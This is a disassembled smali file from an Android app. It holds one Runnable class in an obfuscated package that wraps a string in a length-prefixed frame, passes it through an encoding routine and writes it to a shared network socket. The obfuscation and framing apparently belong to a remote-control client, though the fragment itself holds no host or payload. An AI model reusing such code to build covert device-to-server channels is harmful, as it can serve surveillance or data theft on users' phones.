.class Lcmf0/c3b5bm90zq/patch/C5$2;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C5;->a(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Lcmf0/c3b5bm90zq/patch/C5;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C5;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$2;->b:Lcmf0/c3b5bm90zq/patch/C5;

    iput-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$2;->a:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    const/4 v0, 0x0

    :try_start_0
    invoke-static {v0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C5$2;->a:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C11;->e:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "null"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/a;->a([B)[B

    move-result-object v2

    array-length v3, v2

    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-static {v3}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4, v2}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->e()Ljava/lang/Object;

    move-result-object v2

    monitor-enter v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v3

    array-length v4, v1

    invoke-virtual {v3, v4}, Ljava/net/Socket;->setSendBufferSize(I)V

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C5$2;->b:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v4

    invoke-virtual {v4}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-static {v3, v4}, Lcmf0/c3b5bm90zq/patch/C5;->a(Lcmf0/c3b5bm90zq/patch/C5;Ljava/io/OutputStream;)Ljava/io/OutputStream;

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C5$2;->b:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v3}, Lcmf0/c3b5bm90zq/patch/C5;->b(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/io/OutputStream;

    move-result-object v3

    array-length v4, v1

    invoke-virtual {v3, v1, v0, v4}, Ljava/io/OutputStream;->write([BII)V

    monitor-exit v2

    goto :goto_0

    :catchall_0
    move-exception v0

    monitor-exit v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    :goto_0
    return-void
.end method
